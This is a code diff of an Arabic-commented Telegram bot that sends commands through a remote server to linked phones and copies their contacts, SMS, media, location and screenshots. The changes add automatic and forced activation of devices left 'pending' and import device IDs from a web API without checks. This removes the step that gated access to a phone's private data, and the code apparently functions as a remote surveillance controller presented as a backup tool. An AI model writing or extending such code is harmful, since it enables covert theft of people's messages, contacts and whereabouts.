@@ -157,7 +157,7 @@ class DeviceManager:
             cursor.execute('''
                 INSERT INTO devices (user_id, device_id, activation_code, status)
                 VALUES (?, ?, ?, ?)
-            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'auto_pending'))
+            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'pending'))
 
             conn.commit()
             conn.close()
@@ -511,6 +511,105 @@ class SecurityManager:
 def is_owner(user_id):
     return user_id == OWNER_USER_ID
 
+def get_available_device(user_id):
+    """الحصول على جهاز متاح للاستخدام (نشط أو معلق)"""
+    devices = device_manager.get_user_devices(user_id)
+    
+    if not devices:
+        # محاولة استيراد الأجهزة من الواجهة
+        imported_devices = import_devices_from_web_interface(user_id)
+        if imported_devices:
+            devices = device_manager.get_user_devices(user_id)
+    
+    if not devices:
+        return None, "لا توجد أجهزة"
+    
+    # البحث عن جهاز نشط أولاً
+    active_devices = [d for d in devices if d[1] == 'active']
+    if active_devices:
+        return active_devices[0][0], "نشط"
+    
+    # البحث عن جهاز معلق وتفعيله
+    pending_devices = [d for d in devices if d[1] == 'pending']
+    if pending_devices:
+        device_id = pending_devices[0][0]
+        device_manager.update_device_status(device_id, 'active', 'Auto-activated')
+        return device_id, "تم تفعيله تلقائياً"
+    
+    return None, "لا توجد أجهزة متاحة"
+
+def check_device_connection(device_id):
+    """التحقق من اتصال الجهاز الفعلي"""
+    try:
+        # محاولة الاتصال بالجهاز عبر خادم الأوامر
+        command_server_url = os.environ.get('COMMAND_SERVER_URL', 'https://remote-control-command-server.onrender.com')
+        
+        response = requests.get(f"{command_server_url}/device/{device_id}/status", timeout=5)
+        
+        if response.status_code == 200:
+            status_data = response.json()
+            return status_data.get('connected', False)
+        
+        return False
+    except Exception as e:
+        logger.error(f"خطأ في التحقق من اتصال الجهاز {device_id}: {e}")
+        return False
+
+def force_device_activation(device_id):
+    """إجبار تفعيل الجهاز"""
+    try:
+        # تحديث حالة الجهاز إلى نشط
+        device_manager.update_device_status(device_id, 'active', 'Force activated')
+        
+        # إرسال إشارة تفعيل للجهاز
+        command_server_url = os.environ.get('COMMAND_SERVER_URL', 'https://remote-control-command-server.onrender.com')
+        
+        activation_data = {
+            'device_id': device_id,
+            'action': 'activate',
+            'timestamp': int(time.time())
+        }
+        
+        response = requests.post(f"{command_server_url}/device/activate", json=activation_data, timeout=10)
+        
+        if response.status_code == 200:
+            logger.info(f"تم إجبار تفعيل الجهاز: {device_id}")
+            return True
+        
+        return False
+    except Exception as e:
+        logger.error(f"خطأ في إجبار تفعيل الجهاز {device_id}: {e}")
+        return False
+
+def import_devices_from_web_interface(user_id):
+    """استيراد الأجهزة من واجهة الويب"""
+    try:
+        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web.onrender.com')
+        
+        # محاولة الاتصال بواجهة الويب
+        response = requests.get(f"{web_interface_url}/api/devices", timeout=10)
+        
+        if response.status_code == 200:
+            devices_data = response.json()
+            
+            if 'devices' in devices_data:
+                imported_count = 0
+                for device_data in devices_data['devices']:
+                    device_id = device_data.get('deviceId')
+                    if device_id:
+                        # إضافة الجهاز إذا لم يكن موجوداً
+                        if device_manager.add_device_auto(user_id, device_id):
+                            imported_count += 1
+                
+                logger.info(f"تم استيراد {imported_count} جهاز من واجهة الويب")
+                return imported_count > 0
+        
+        return False
+        
+    except Exception as e:
+        logger.error(f"خطأ في استيراد الأجهزة من واجهة الويب: {e}")
+        return False
+
 # تهيئة المدراء
 device_manager = DeviceManager(DB_FILE)
 command_executor = CommandExecutor(COMMAND_SERVER_URL)
@@ -751,6 +850,63 @@ def link_device(message):
     else:
         bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")
 
+
+@bot.message_handler(commands=['force_activate'])
+def force_activate_devices(message):
+    """إجبار تفعيل جميع الأجهزة المعلقة"""
+    user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    # الحصول على جميع الأجهزة
+    devices = device_manager.get_user_devices(user_id)
+    
+    if not devices:
+        bot.reply_to(message, "📱 لا توجد أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
+        return
+
+    activated_count = 0
+    failed_count = 0
+    
+    for device_id, status, last_seen, device_info in devices:
+        if status == 'pending':
+            # محاولة إجبار تفعيل الجهاز
+            if force_device_activation(device_id):
+                activated_count += 1
+            else:
+                failed_count += 1
+    
+    if activated_count > 0:
+        result_text = f"""
+🔧 **تم إجبار تفعيل الأجهزة:**
+
+✅ **تم تفعيل:** {activated_count} جهاز
+❌ **فشل في التفعيل:** {failed_count} جهاز
+
+📱 **يمكنك الآن استخدام الأوامر:**
+• `/contacts` - نسخ جهات الاتصال
+• `/sms` - نسخ الرسائل النصية
+• `/media` - نسخ الوسائط
+• `/location` - الحصول على الموقع
+• `/screenshot` - التقاط لقطة شاشة
+        """
+        bot.reply_to(message, result_text, parse_mode='Markdown')
+    else:
+        bot.reply_to(message, f"❌ فشل في تفعيل أي جهاز.\nفشل: {failed_count} جهاز")
+    
+    device_manager.log_activity(user_id, 'force_activate_devices', f'activated: {activated_count}, failed: {failed_count}')
+
+
 @bot.message_handler(commands=['devices'])
 def list_devices(message):
     """عرض الأجهزة المرتبطة"""
@@ -819,16 +975,28 @@ def backup_contacts(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
-    # الحصول على الأجهزة النشطة
+    # الحصول على جميع الأجهزة (نشطة ومعلقة)
     devices = device_manager.get_user_devices(user_id)
-    active_devices = [d for d in devices if d[1] == 'active']
-
-    if not active_devices:
-        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
+    
+    if not devices:
+        bot.reply_to(message, "📱 ليس لديك أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    # إرسال الأمر للجهاز الأول النشط
-    device_id = active_devices[0][0]
+    # البحث عن جهاز نشط أولاً، ثم جهاز معلق
+    active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
+    
+    if active_devices:
+        device_id = active_devices[0][0]
+        device_status = "نشط"
+    elif pending_devices:
+        # تفعيل الجهاز المعلق تلقائياً
+        device_id = pending_devices[0][0]
+        device_manager.update_device_status(device_id, 'active', 'Auto-activated')
+        device_status = "تم تفعيله تلقائياً"
+    else:
+        bot.reply_to(message, "❌ لا توجد أجهزة متاحة للاستخدام.")
+        return
 
     # حفظ الأمر
     command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')
@@ -900,14 +1068,12 @@ def backup_media(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
-    devices = device_manager.get_user_devices(user_id)
-    active_devices = [d for d in devices if d[1] == 'active']
-
-    if not active_devices:
-        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
+    device_id, status = get_available_device(user_id)
+    
+    if not device_id:
+        bot.reply_to(message, f"❌ {status}.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    device_id = active_devices[0][0]
     command_id = device_manager.save_command(user_id, device_id, 'backup_media')
 
     result = command_executor.send_command(device_id, 'backup_media')
@@ -916,7 +1082,7 @@ def backup_media(message):
         bot.reply_to(message, f"❌ خطأ: {result['error']}")
         device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        bot.reply_to(message, "📸 جاري نسخ الوسائط...\nقد يستغرق هذا وقتاً طويلاً.")
+        bot.reply_to(message, f"📸 جاري نسخ الوسائط...\nالجهاز: {device_id} ({status})\nقد يستغرق هذا وقتاً طويلاً.")
         device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_media', f'device_id: {device_id}')
